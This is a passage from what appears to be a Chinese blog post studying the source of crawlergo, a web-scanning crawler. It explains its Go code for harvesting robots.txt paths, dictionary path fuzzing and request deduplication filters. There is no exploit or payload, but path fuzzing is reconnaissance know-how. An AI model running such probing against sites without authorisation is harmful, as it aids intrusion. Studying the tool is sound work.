collect_links.go// 链接收集 添加到请求列表<br>│   │   ├── intercept_request.go// 请求处理 响应解析<br>│   │   ├── tab.go// 爬虫启动...<br>│   ├── filter<br>│   │   ├── filter.go<br>│   │   ├── simple_filter.go// 简单过滤<br>│   │   ├── smart_filter.go// 智能过滤 =&gt; 打标签<br>│   │   └── smart_filter_test.go<br>│   ├── js<br>│   │   └── javascript.go// 注入的 JS<br>│   ├── logger<br>│   │   └── logger.go<br>│   ├── model<br>│   │   ├── request.go<br>│   │   ├── url.go<br>│   │   └── url_test.go<br>│   ├── path_expansion.go// robots<br>│   ├── taskconfig.go<br>│   ├── taskconfig_test.go<br>│   ├── task_main.go<br>│   └── tools<br>│       ├── common.go<br>│       ├── random.go<br>│       └── requests<br>│           ├── requests.go<br>│           ├── response.go<br>│           └── utils.go<br>├── README.md<br>└── README_zh-cn.md<br></code></pre></td></tr></table></figure><p>画了一下导图：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/crawlergo.png?imageSlim" alt="crawlergo"></p><h2 id="源码学习"><a href="#源码学习" class="headerlink" title="源码学习"></a>源码学习</h2><p>跟着 crawlergo 的流程走一遍，具体的逻辑在 pkg&#x2F;task_main.go 的 Run()：</p><ol><li>通过 robots.txt 获取</li><li>通过 Fuzz 目录获取</li><li>收集到的 url 进行过滤后添加到 initTasks 中</li><li>开始对 initTasks 中的目标进行爬行 addTask2Pool </li><li>对所有请求进行去重处理</li><li>从去重后的请求中收集子域名 host</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *CrawlerTask)</span></span> Run() &#123;<br><span class="hljs-keyword">defer</span> t.Pool.Release()  <span class="hljs-comment">// 释放协程池</span><br><span class="hljs-keyword">defer</span> t.Browser.Close() <span class="hljs-comment">// 关闭浏览器</span><br><br>t.Start = time.Now()<br><span class="hljs-comment">// 从 robots.txt 中获取 </span><br><span class="hljs-keyword">if</span> t.Config.PathFromRobots &#123;<br>reqsFromRobots := GetPathsFromRobots(*t.Targets[<span class="hljs-number">0</span>])<br>logger.Logger.Info(<span class="hljs-string">&quot;get paths from robots.txt: &quot;</span>, <span class="hljs-built_in">len</span>(reqsFromRobots))<br><span class="hljs-comment">// 获取的的目标添加到 Targets 中</span><br>t.Targets = <span class="hljs-built_in">append</span>(t.Targets, reqsFromRobots...)<br>&#125;<br><span class="hljs-comment">// 通过 Fuzz 获取 </span><br><span class="hljs-keyword">if</span> t.Config.FuzzDictPath != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">if</span> t.Config.PathByFuzz &#123;<br>logger.Logger.Warn(<span class="hljs-string">&quot;`--fuzz-path` is ignored, using `--fuzz-path-dict` instead&quot;</span>)<br>&#125;<br>reqsByFuzz := GetPathsByFuzzDict(*t.Targets[<span class="hljs-number">0</span>], t.Config.FuzzDictPath)<br>t.Targets = <span class="hljs-built_in">append</span>(t.Targets, reqsByFuzz...)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> t.Config.PathByFuzz &#123;<br>reqsByFuzz := GetPathsByFuzz(*t.Targets[<span class="hljs-number">0</span>])<br>logger.Logger.Info(<span class="hljs-string">&quot;get paths by fuzzing: &quot;</span>, <span class="hljs-built_in">len</span>(reqsByFuzz))<br>t.Targets = <span class="hljs-built_in">append</span>(t.Targets, reqsByFuzz...)<br>&#125;<br><br>t.Result.AllReqList = t.Targets[:]<br><br><span class="hljs-keyword">var</span> initTasks []*model.Request<br><span class="hljs-comment">// 对请求进行过滤 打标记 计算唯一 ID 通过 SET 存储</span><br><span class="hljs-keyword">for</span> _, req := <span class="hljs-keyword">range</span> t.Targets &#123;<br><span class="hljs-keyword">if</span> t.filter.DoFilter(req) &#123;<br>logger.Logger.Debugf(<span class="hljs-string">&quot;filter req: &quot;</span> + req.URL.RequestURI())<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 没有重复 添加到任务列表</span><br>initTasks = <span class="hljs-built_in">append</span>(initTasks, req)<br>t.Result.ReqList = <span class="hljs-built_in">append</span>(t.Result.ReqList, req)<br>&#125;<br>logger.Logger.Info(<span class="hljs-string">&quot;filter repeat, target count: &quot;</span>, <span class="hljs-built_in">len</span>(initTasks))<br><span class="hljs-comment">// 遍历请求队列 开始访问</span><br><span class="hljs-keyword">for</span> _, req := <span class="hljs-keyword">range</span> initTasks &#123;<br><span class="hljs-keyword">if</span> !engine2.IsIgnoredByKeywordMatch(*req, t.Config.IgnoreKeywords) &#123;<br>t.addTask2Pool(req)<br>&#125;<br>&#125;<br><br>t.taskWG.Wait()<br><br><span class="hljs-comment">// 对全部请求进行唯一去重</span><br>todoFilterAll := <span class="hljs-built_in">make</span>([]*model.Request, <span class="hljs-built_in">len</span>(t.Result.AllReqList))<br><span class="hljs-built_in">copy</span>(todoFilterAll, t.Result.AllReqList)<br><br>t.Result.AllReqList = []*model.Request&#123;&#125;<br><span class="hljs-keyword">var</span> simpleFilter filter2.SimpleFilter<br><span class="hljs-keyword">for</span> _, req := <span class="hljs-keyword">range</span> todoFilterAll &#123;<br><span class="hljs-keyword">if</span> !simpleFilter.UniqueFilter(req) &#123;<br>t.Result.AllReqList = <span class="hljs-built_in">append</span>(t.Result.AllReqList, req)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 全部域名</span><br>t.Result.AllDomainList = AllDomainCollect(t.Result.AllReqList)<br><span class="hljs-comment">// 子域名</span><br>t.Result.SubDomainList = SubDomainCollect(t.Result.AllReqList, t.RootDomain)<br>&#125;<br></code></pre></td></tr></table></figure><p>robots.txt 获取：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetPathsFromRobots</span><span class="hljs-params">(navReq model2.Request)</span></span> []*model2.Request &#123;<br>logger.Logger.Info(<span class="hljs-string">&quot;starting to get paths from robots.txt.&quot;</span>)<br><span class="hljs-keyword">var</span> result []*model2.Request<br>    <span class="hljs-comment">// 通过正则找到 Disallow: 这种格式后面的路径</span><br><span class="hljs-keyword">var</span> urlFindRegex = regexp.MustCompile(<span class="hljs-string">`(?:Disallow|Allow):.*?(/.+)`</span>)<br><span class="hljs-keyword">var</span> urlRegex = regexp.MustCompile(<span class="hljs-string">`(/.+)`</span>)<br><br>navReq.URL.Path = <span class="hljs-string">&quot;/&quot;</span><br>url := navReq.URL.NoQueryUrl() + <span class="hljs-string">&quot;robots.txt&quot;</span><br><br>resp, err := requests.Get(url, tools.ConvertHeaders(navReq.Headers),<br>&amp;requests.ReqOptions&#123;AllowRedirect: <span class="hljs-literal">false</span>,<br>Timeout: <span class="hljs-number">5</span>,<br>Proxy:   navReq.Proxy&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">//for</span><br><span class="hljs-comment">//logger.Logger.Error(&quot;request to robots.txt error &quot;, err)</span><br><span class="hljs-keyword">return</span> result<br>&#125;<br><br><span class="hljs-keyword">if</span> resp.StatusCode &lt; <span class="hljs-number">200</span> || resp.StatusCode &gt;= <span class="hljs-number">300</span> &#123;<br><span class="hljs-keyword">return</span> result<br>&#125;<br>urlList := urlFindRegex.FindAllString(resp.Text, <span class="hljs-number">-1</span>)<br>    <span class="hljs-comment">// 生成 req</span><br><span class="hljs-keyword">for</span> _, _url := <span class="hljs-keyword">range</span> urlList &#123;<br>_url = strings.TrimSpace(_url)<br>_url = urlRegex.FindString(_url)<br>url, err := model2.GetUrl(_url, *navReq.URL)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>req := model2.GetRequest(config.GET, url)<br>req.Source = config.FromRobots<br>result = <span class="hljs-built_in">append</span>(result, &amp;req)<br>&#125;<br><span class="hljs-keyword">return</span> result<br>&#125;<br></code></pre></td></tr></table></figure><p>Fuzz：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doFuzz</span><span class="hljs-params">(navReq model2.Request, pathList []<span class="hljs-type">string</span>)</span></span> []*model2.Request &#123;<br>validateUrl = mapset.NewSet()<br><span class="hljs-keyword">var</span> result []*model2.Request<br>pool, _ := ants.NewPool(<span class="hljs-number">20</span>)<br><span class="hljs-keyword">defer</span> pool.Release()<br><span class="hljs-keyword">for</span> _, path := <span class="hljs-keyword">range</span> pathList &#123;<br>path = strings.TrimPrefix(path, <span class="hljs-string">&quot;/&quot;</span>)<br>path = strings.TrimSuffix(path, <span class="hljs-string">&quot;\n&quot;</span>)<br>task := singleFuzz&#123;<br>navReq: navReq,<br>path:   path,<br>&#125;<br>pathFuzzWG.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-comment">// 发起请求</span><br>err := pool.Submit(task.doRequest)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>pathFuzzWG.Done()<br>&#125;<br>&#125;()<br>&#125;<br><br>pathFuzzWG.Wait()<br>    <span class="hljs-comment">// 对 URL 进行处理 生成 req</span><br><span class="hljs-keyword">for</span> _, _url := <span class="hljs-keyword">range</span> validateUrl.ToSlice() &#123;<br>_url := _url.(<span class="hljs-type">string</span>)<br>url, err := model2.GetUrl(_url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>req := model2.GetRequest(config.GET, url)<br>req.Source = config.FromFuzz<br>result = <span class="hljs-built_in">append</span>(result, &amp;req)<br>&#125;<br><span class="hljs-keyword">return</span> result<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s singleFuzz)</span></span> doRequest() &#123;<br><span class="hljs-keyword">defer</span> pathFuzzWG.Done()<br><br>url := fmt.Sprintf(<span class="hljs-string">`%s://%s/%s`</span>, s.navReq.URL.Scheme, s.navReq.URL.Host, s.path)<br>resp, errs := requests.Get(url, tools.ConvertHeaders(s.navReq.Headers),<br>&amp;requests.ReqOptions&#123;Timeout: <span class="hljs-number">2</span>, AllowRedirect: <span class="hljs-literal">false</span>, Proxy: s.navReq.Proxy&#125;)<br><span class="hljs-keyword">if</span> errs != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>    <span class="hljs-comment">// 将存活的 URL 放到 validateUrl Set 中</span><br><span class="hljs-keyword">if</span> resp.StatusCode &gt;= <span class="hljs-number">200</span> &amp;&amp; resp.StatusCode &lt; <span class="hljs-number">300</span> &#123;<br>validateUrl.Add(url)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> resp.StatusCode == <span class="hljs-number">301</span> &#123;<br>locations := resp.Header[<span class="hljs-string">&quot;Location&quot;</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(locations) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>location := locations[<span class="hljs-number">0</span>]<br>redirectUrl, err := model2.GetUrl(location)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> redirectUrl.Host == s.navReq.URL.Host &#123;<br>validateUrl.Add(url)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>DoFilter 这里会先对初始收集到的 url 进行一个过滤，看一下过滤：</p><p>这里有两个：</p><ol><li>simple_filter</li><li>smart_filter</li></ol><p>simple_filter：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewSimpleFilter</span><span class="hljs-params">(host <span class="hljs-type">string</span>)</span></span> *SimpleFilter &#123;<br>staticSuffixSet := config.StaticSuffixSet.Clone()<br><br><span class="hljs-keyword">for</span> _, suffix := <span class="hljs-keyword">range</span> []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;js&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>, <span class="hljs-string">&quot;json&quot;</span>&#125; &#123;<br>staticSuffixSet.Add(suffix)<br>&#125;<br>s := &amp;SimpleFilter&#123;UniqueSet: mapset.NewSet(), staticSuffixSet: staticSuffixSet, HostLimit: host&#125;<br><span class="hljs-keyword">return</span> s<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>域名限制 &#x3D;&gt; 限制爬取的域名</li><li>Unique 去重</li><li>静态资源</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SimpleFilter)</span></span> DoFilter(req *model.Request) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> s.UniqueSet == <span class="hljs-literal">nil</span> &#123;<br>s.UniqueSet = mapset.NewSet()<br>&#125;<br><span class="hljs-comment">// 过滤域名</span><br><span class="hljs-keyword">if</span> s.HostLimit != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; s.DomainFilter(req) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">// Unique 去重</span><br><span class="hljs-keyword">if</span> s.UniqueFilter(req) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">// 过滤静态资源</span><br><span class="hljs-keyword">if</span> s.StaticFilter(req) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 Unique 是使用的 req.UniqueId() ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SimpleFilter)</span></span> UniqueFilter(req *model.Request) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> s.UniqueSet == <span class="hljs-literal">nil</span> &#123;<br>s.UniqueSet = mapset.NewSet()<br>&#125;<br><span class="hljs-keyword">if</span> s.UniqueSet.Contains(req.UniqueId()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>s.UniqueSet.Add(req.UniqueId())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看一下这个 UniqueId 是怎么生成的：</p><p>这里是根据请求方法 + URL + Post数据进行 MD5 获取的 UinqueId 值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(req *Request)</span></span> UniqueId() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">if</span> req.RedirectionFlag &#123;<br><span class="hljs-keyword">return</span> tools.StrMd5(req.NoHeaderId() + <span class="hljs-string">&quot;Redirection&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> req.NoHeaderId()<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(req *Request)</span></span> NoHeaderId() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> tools.StrMd5(req.Method + req.URL.String() + req.PostData)<br>&#125;<br></code></pre></td></tr></table></figure><p>静态资源过滤：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SimpleFilter)</span></span> StaticFilter(req *model.Request) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> s.UniqueSet == <span class="hljs-literal">nil</span> &#123;<br>s.UniqueSet = mapset.NewSet()<br>&#125;<br><span class="hljs-comment">// 首先将slice转换成map</span><br><br><span class="hljs-keyword">if</span> req.URL.FileExt() == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>    <span class="hljs-comment">// 后缀是 &quot;js&quot;, &quot;css&quot;, &quot;json&quot; 就过滤 ？</span><br><span class="hljs-keyword">if</span> s.staticSuffixSet.Contains(req.URL.FileExt()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里不太明白 JS 为什么要过滤，虽然动态爬虫是去模拟浏览器触发请求，但是 JS 里面也有可能存在一些路径或者敏感信息。</p><p>在看一下这个 smart_filter 过滤模式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SmartFilter)</span></span> DoFilter(req *model.Request) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">// 首先过滤掉静态资源、基础的去重、过滤其它的域名</span><br><span class="hljs-keyword">if</span> s.SimpleFilter.DoFilter(req) &#123;<br>logger.Logger.Debugf(<span class="hljs-string">&quot;filter req by simplefilter: &quot;</span> + req.URL.RequestURI())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>    <span class="hljs-comment">// 计算 Fragment ID</span><br>req.Filter.FragmentID = s.calcFragmentID(req.URL.Fragment)<br><span class="hljs-comment">// 标记</span><br><span class="hljs-keyword">if</span> req.Method == config.GET || req.Method == config.DELETE || req.Method == config.HEAD || req.Method == config.OPTIONS &#123;<br>s.getMark(req)<br>s.repeatCountStatistic(req)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> req.Method == config.POST || req.Method == config.PUT &#123;<br>s.postMark(req)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>logger.Logger.Debug(<span class="hljs-string">&quot;dont support such method: &quot;</span> + req.Method)<br>&#125;<br><span class="hljs-comment">// 对标记后的请求进行去重</span><br>uniqueId := req.Filter.UniqueId<br><span class="hljs-keyword">if</span> s.uniqueMarkedIds.Contains(uniqueId) &#123;<br>logger.Logger.Debugf(<span class="hljs-string">&quot;filter req by uniqueMarkedIds 1: &quot;</span> + req.URL.RequestURI())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">// 全局数值型参数标记</span><br>s.globalFilterLocationMark(req)<br><span class="hljs-comment">// 接下来对标记的 GET 请求进行去重</span><br><span class="hljs-keyword">if</span> req.Method == config.GET || req.Method == config.DELETE || req.Method == config.HEAD || req.Method == config.OPTIONS &#123;<br><span class="hljs-comment">// 对超过阈值的GET请求进行标记</span><br>s.overCountMark(req)<br><span class="hljs-comment">// 重新计算 QueryMapId</span><br>req.Filter.QueryMapId = getParamMapID(req.Filter.MarkedQueryMap)<br><span class="hljs-comment">// 重新计算 PathId</span><br>req.Filter.PathId = getPathID(req.Filter.MarkedPath)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 重新计算 PostDataId</span><br>req.Filter.PostDataId = getParamMapID(req.Filter.MarkedPostDataMap)<br>&#125;<br><span class="hljs-comment">// 重新计算请求唯一ID</span><br>req.Filter.UniqueId = getMarkedUniqueID(req)<br><span class="hljs-comment">// 新的ID再次去重</span><br>newUniqueId := req.Filter.UniqueId<br><span class="hljs-keyword">if</span> s.uniqueMarkedIds.Contains(newUniqueId) &#123;<br>logger.Logger.Debugf(<span class="hljs-string">&quot;filter req by uniqueMarkedIds 2: &quot;</span> + req.URL.RequestURI())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">// 添加到结果集中</span><br>s.uniqueMarkedIds.Add(newUniqueId)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><ol><li>使用 simple_filter 简单过滤</li><li>计算 Fragment 的 ID </li><li>对请求进行打标记</li><li>通过标记后的 ID 进行去重</li><li>接下来对标记的 GET 请求进行去重</li></ol><p>calcFragmentID：</p><p>fragment 就是 # 后面的字符串：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/323a4e635d9746da89c45c1108d5de60.png?imageSlim"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// calcFragmentID 计算 fragment 唯一值，如果 fragment 的格式为 url path</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *SmartFilter)</span></span> calcFragmentID(fragment <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">if</span> fragment == <span class="hljs-string">&quot;&quot;</span> || !strings.HasPrefix(fragment, <span class="hljs-string">&quot;/&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>    <span class="hljs-comment">// 拼接获取 fragment 的 url</span><br>fakeUrl, err := model.GetUrl(fragment)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>logger.Logger.Error(<span class="hljs-string">&quot;cannot calculate url fragment: &quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>    <span class="hljs-comment">// 对 fragment url 打标记 获取 UniqueId</span><br><span class="hljs-comment">// <span class="hljs-doctag">XXX:</span> discuss https://github.com/Qianlitp/crawlergo/issues/100</span><br>fakeReq := model.GetRequest(config.GET, fakeUrl)<br>s.getMark(&amp;fakeReq)<br><span class="hljs-comment">// s.repeatCountStatistic(&amp;fakeReq)</span><br><span class="hljs-keyword">return</span> fakeReq.Filter.UniqueId<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是看看它是怎么去打标记的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code 